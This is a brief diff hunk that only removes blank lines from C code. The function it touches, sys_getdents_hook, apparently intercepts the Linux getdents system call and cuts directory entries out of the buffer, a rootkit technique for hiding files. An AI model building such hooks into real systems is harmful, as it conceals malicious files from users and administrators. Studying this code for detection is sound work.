@@ -44,11 +44,8 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 
                 tempbuf = kmalloc(sizeof(char) * count, GFP_KERNEL);
                 copy_from_user(tempbuf, dirp, count);
-
                 memmove(tempbuf + bpos ,tempbuf + bpos + copied.d_reclen, rem);
-
                 copy_to_user(dirp, tempbuf, count);
-
                 kfree(tempbuf);
 
                 nread -= copied.d_reclen;
